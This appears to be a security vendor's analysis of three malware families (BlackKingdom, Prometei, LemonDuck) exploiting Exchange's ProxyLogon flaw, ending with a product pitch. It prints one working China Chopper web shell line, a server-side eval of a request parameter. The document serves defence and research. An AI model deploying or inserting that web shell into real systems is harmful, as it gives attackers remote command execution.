Figure 1. The malware infection chains of BlackKingdom, Prometei, and LemonDuck
Leveraging the ProxyLogon vulnerability allowed the threat actors behind BlackKingdom, Prometei, and LemonDuck to execute Chopper web
shells (detected by Trend Micro as Backdoor.JS.CHOPPER.SMYCBCD and Trojan.ASP.CVE202126855.SM), which then led to the
deployment of the final payload in their respective infections. The China Chopper web shell, which was first discovered in 2012, continues to
be widely used by threat actors in their campaigns to gain remote access to a targeted system. It's recently been found in many ransomware
families, such as Hello ransomware.
Once they have compromised a system, these can start deploying malicious activities, such as dropping ExchDefender.exe, a binary file seen
in BlackKingdom and Prometei cases, or using a WMI modifier that leads to a LemonDuck infection.
BlackKingdom and Prometei infections
Both BlackKingdom (detected by Trend Micro as Ransom.Win64.BLACKKINGDOM) and Prometei (detected as Backdoor.Win64.PROMETEI,
TrojanSpy.Win32.PROMETEI, Coinminer.Win64.MALXMR, and Coinminer.Win64.TOOLXMR) infections make use of ExchDefender.exe,
which copies itself to a Windows folder. It then creates MSExchangeDefenderPL, a service that contains its main routine and poses as security
software for Microsoft Exchange (Figure 2). This service will execute the binary file in the Windows folder with the command line “Dcomsvc”
(Figure 3).

MSExchangeDefenderPL will then start enumerating files contained in this folder:
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth.
It searches this directory for files related to web shells used in other attacks and deletes them to make sure it’s the only remaining malware in
the system (Figure 4). These files are as follows:
ExpiredPassword.aspx
frowny.aspx
logoff.aspx
logon.aspx
OutlookCN.aspx
RedirSuiteServiceProxy.aspx
signout.aspx
SvmFeedback.aspx

MSExchangeDefenderPL
At this point, both BlackKingdom and Prometei will leverage the ProxyLogon vulnerability to deploy the Chopper web shell using a builder that
modifies the Offline Address Book (OAB). Once the OAB has undergone the malicious modifications and is launched, an .ASPX web shell is
created via JavaScript on the system (Figure 5). It will then connect to the virtual path to initialize the malicious web shell (Figure 6).

LemonDuck infections
Similarly, LemonDuck (detected by Trend Micro as Trojan.PS1.LEMONDUCK) capitalizes on the ProxyLogon bug to target systems, but its
infection utilizes Windows Management Instrumentation (WMI) to modify the OAB. In one such WMI entry, we have observed a PowerShell
process that executes a Base64-encoded command (Figure 7). Deobfuscating the command revealed that it’s capable of modifying the
ExernalUrl parameter of a specific .ASPX file (Figure 8).

.ASPX file
This enables the remote execution of commands once the .ASPX file is loaded, a common technique used by China Chopper. The command
that executes the Chopper is as follows:
<script language="JScript" runat="server">function Page_Load(){/*Exchange Service*/eval(Request["unsafe"],"unsafe");}</script>
China Chopper is a web shell that’s capable of receiving and executing backdoor commands. In this case, it drops the payload for the
LemonDuck malware.
Trend Micro solutions
Trend Micro’s comprehensive XDR solution applies the most effective expert analytics to the deep data sets collected from Trend Micro
solutions across the enterprise — including email, endpoints, servers, cloud workloads, and networks — making faster connections to identify
and stop attacks. Powerful artificial intelligence and expert security analytics correlate data from customer environments and Trend Micro’s
global threat intelligence to deliver fewer, higher-fidelity alerts, leading to better, early detection. One console with one source of prioritized,
optimized alerts supported with guided investigation simplifies the steps needed to fully understand the attack path and impact on the
organization.

Exploits & Vulnerabilities
Our telemetry showed three malware families taking advantage of the ProxyLogon vulnerability beginning in March: the coinminer LemonDuck
was sighted first, quickly followed by the ransomware BlackKingdom, then the Prometei botnet.
